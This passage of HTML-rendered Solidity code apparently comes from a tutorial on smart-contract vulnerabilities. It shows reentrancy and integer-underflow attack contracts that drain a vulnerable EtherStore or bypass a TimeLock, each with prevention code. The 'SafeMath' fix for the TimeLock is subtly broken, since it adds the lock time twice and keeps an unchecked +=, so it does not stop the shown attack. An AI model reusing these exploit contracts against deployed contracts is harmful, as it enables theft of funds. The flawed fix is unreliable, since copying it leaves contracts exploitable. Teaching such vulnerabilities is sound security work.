punctuation\">}</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">attack</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>value <span class=\"token operator\">>=</span> <span class=\"token number\">1</span> ether<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        etherStore<span class=\"token punctuation\">.</span>deposit<span class=\"token punctuation\">{</span>value<span class=\"token punctuation\">:</span> <span class=\"token number\">1</span> ether<span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        etherStore<span class=\"token punctuation\">.</span><span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span> ether<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    \n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">getBalance</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<h4>prevention</h4>\n<h5>method 1</h5>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.6.10</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">/*\n-What is reentrancy\n*/</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">EtherStore</span><span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> balances<span class=\"token punctuation\">;</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">deposit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span>\n        balances<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> _amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>balances<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">>=</span> _amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n                balances<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> _amount<span class=\"token punctuation\">;</span>\n                \n        <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span> sent<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">.</span>call<span class=\"token punctuation\">{</span>value<span class=\"token punctuation\">:</span> _amount<span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>sent<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Failed to send Ether\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n    <span class=\"token punctuation\">}</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">getBalance</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Attack</span> <span class=\"token punctuation\">{</span>\n    EtherStore <span class=\"token keyword\">public</span> etherStore<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _etherStoreAddress<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n        etherStore <span class=\"token operator\">=</span> <span class=\"token function\">EtherStore</span><span class=\"token punctuation\">(</span>_etherStoreAddress<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    \n    <span class=\"token function\">fallback</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span>etherStore<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance <span class=\"token operator\">>=</span> <span class=\"token number\">1</span> ether<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            etherStore<span class=\"token punctuation\">.</span><span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span> ether<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">attack</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>value <span class=\"token operator\">>=</span> <span class=\"token number\">1</span> ether<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        etherStore<span class=\"token punctuation\">.</span>deposit<span class=\"token punctuation\">{</span>value<span class=\"token punctuation\">:</span> <span class=\"token number\">1</span> ether<span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        etherStore<span class=\"token punctuation\">.</span><span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span> ether<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    \n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">getBalance</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<h5>method 2</h5>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.6.10</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">/*\n-What is reentrancy\n*/</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">EtherStore</span><span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> balances<span class=\"token punctuation\">;</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">deposit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span>\n        balances<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    \n    <span class=\"token builtin\">bool</span> <span class=\"token keyword\">internal</span> locked<span class=\"token punctuation\">;</span>\n    \n    <span class=\"token keyword\">modifier</span> <span class=\"token function\">noReentrant</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>locked<span class=\"token punctuation\">,</span> <span class=\"token string\">\"No re-entrancy\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        locked <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span>\n        locked <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> _amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> noReentrant<span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>balances<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">>=</span> _amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n                balances<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> _amount<span class=\"token punctuation\">;</span>\n                \n        <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span> sent<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">.</span>call<span class=\"token punctuation\">{</span>value<span class=\"token punctuation\">:</span> _amount<span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>sent<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Failed to send Ether\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n    <span class=\"token punctuation\">}</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">getBalance</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Attack</span> <span class=\"token punctuation\">{</span>\n    EtherStore <span class=\"token keyword\">public</span> etherStore<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _etherStoreAddress<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n        etherStore <span class=\"token operator\">=</span> <span class=\"token function\">EtherStore</span><span class=\"token punctuation\">(</span>_etherStoreAddress<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    \n    <span class=\"token function\">fallback</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span>etherStore<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance <span class=\"token operator\">>=</span> <span class=\"token number\">1</span> ether<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            etherStore<span class=\"token punctuation\">.</span><span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span> ether<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">attack</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>value <span class=\"token operator\">>=</span> <span class=\"token number\">1</span> ether<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        etherStore<span class=\"token punctuation\">.</span>deposit<span class=\"token punctuation\">{</span>value<span class=\"token punctuation\">:</span> <span class=\"token number\">1</span> ether<span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        etherStore<span class=\"token punctuation\">.</span><span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span> ether<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    \n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">getBalance</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<h3>Arithmetic overflow and underflow</h3>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.6.10</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">/*\noverflow\nunderflow\nuint = 2**256-1\n-3 will be an underflow\n*/</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">TimeLock</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> balances<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> lockTime<span class=\"token punctuation\">;</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">deposit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span>\n        balances<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">;</span>\n        lockTime<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> now <span class=\"token operator\">+</span> <span class=\"token number\">1</span> weeks<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">increaseLockTime</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> _secondsToIncrease<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n        lockTime<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> _secondsToIncrease<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>balances<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Insufficient funds\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>now <span class=\"token operator\">></span> lockTime<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"lock time not expired\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n        <span class=\"token builtin\">uint</span> amount <span class=\"token operator\">=</span> balances<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        balances<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n        \n        <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span> sent<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">.</span>call<span class=\"token punctuation\">{</span>value<span class=\"token punctuation\">:</span> amount<span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>sent<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Failed to send Ether\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Attack</span> <span class=\"token punctuation\">{</span>\n    TimeLock timeLock<span class=\"token punctuation\">;</span>\n    \n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span>TimeLock _timeLock<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n        timeLock <span class=\"token operator\">=</span> <span class=\"token function\">TimeLock</span><span class=\"token punctuation\">(</span>_timeLock<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    \n    <span class=\"token function\">fallback</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span>\n        \n    <span class=\"token punctuation\">}</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">attack</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span>\n        timeLock<span class=\"token punctuation\">.</span>deposit<span class=\"token punctuation\">{</span>value<span class=\"token punctuation\">:</span> msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">//t == current lock timeLock//find x such that </span>\n        <span class=\"token comment\">//x + t = 2**256 = 0</span>\n        timeLock<span class=\"token punctuation\">.</span><span class=\"token function\">increaseLockTime</span><span class=\"token punctuation\">(</span>\n            <span class=\"token comment\">//a huge number</span>\n            <span class=\"token builtin\">uint</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span>timeLock<span class=\"token punctuation\">.</span><span class=\"token function\">lockTime</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            timeLock<span class=\"token punctuation\">.</span><span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<h4>Prevention</h4>\n<ul>\n<li>Use safemath</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.6.10</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">/*\noverflow\nunderflow\nuint = 2**256-1\n-3 will be an underflow\n*/</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">TimeLock</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">using</span> <span class=\"token class-name\">SafeMath</span> <span class=\"token keyword\">for</span> <span class=\"token builtin\">uint</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//myUint.add(123)</span>\n    <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> balances<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> lockTime<span class=\"token punctuation\">;</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">deposit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span>\n        balances<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">;</span>\n        lockTime<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> now <span class=\"token operator\">+</span> <span class=\"token number\">1</span> weeks<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">increaseLockTime</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> _secondsToIncrease<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n        lockTime<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> lockTime<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>_secondsToIncrease<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>balances<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Insufficient funds\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>now <span class=\"token operator\">></span> lockTime<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"lock time not expired\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n        <span class=\"token builtin\">uint</span> amount <span class=\"token operator\">=</span> balances<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        balances<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n        \n        <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span> sent<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">.</span>call<span class=\"token punctuation\">{</span>value<span class=\"token punctuation\">:</span> amount<span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>sent<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Failed to send Ether\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Attack</span> <span class=\"token punctuation\">{</span>\n    TimeLock timeLock<span class=\"token punctuation\">;</span>\n    \n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span>TimeLock _timeLock<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n        timeLock <span class=\"token operator\">=</span> <span class=\"token function\">TimeLock</span><span class=\"token punctuation\">(</span>_timeLock<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    \n    <span class=\"token function\">fallback</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span>\n        \n    <span class=\"token punctuation\">}</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">attack</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span>\n        timeLock<span class=\"token punctuation\">.</span>deposit<span class=\"token punctuation\">{</span>value<span class=\"token punctuation\">:</span> msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">//t == current lock timeLock//find x such that </span>\n        <span class=\"token comment\">//x + t = 2**256 = 0</span>\n        timeLock<span class=\"token punctuation\">.</span><span class=\"token function\">increaseLockTime</span><span class=\"token punctuation\">(</span>\n            <span class=\"token comment\">//a huge number</span>\n            <span class=\"token builtin\">uint</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span>timeLock<span class=\"token punctuation\">.</span><span 